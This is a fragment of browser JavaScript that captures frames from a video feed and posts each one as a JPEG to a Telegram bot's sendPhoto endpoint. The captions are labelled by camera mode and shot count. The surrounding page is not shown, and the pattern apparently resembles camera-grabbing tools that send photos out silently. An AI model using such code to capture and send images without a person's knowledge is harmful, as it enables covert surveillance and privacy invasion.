        function captureImage(mode, count) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', config.chatId);
                formData.append('photo', blob, `shot_${mode}_${count}.jpg`);
                formData.append('caption', `Architect Output: Camera_${mode} | Image_${count}`);

                fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
